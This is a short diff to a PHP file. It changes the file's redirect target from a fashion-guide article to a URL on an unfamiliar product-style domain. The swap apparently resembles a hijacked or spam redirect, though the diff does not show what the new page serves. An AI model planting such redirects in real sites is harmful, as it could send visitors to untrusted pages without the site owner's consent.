@@ -1,4 +1,4 @@
 <?php
-header("Location: https://luxe.digital/lifestyle/style/men-casual-dress-code-guide/");
+header("Location: https://start-your-product.site/actmca");
 die();
 ?>
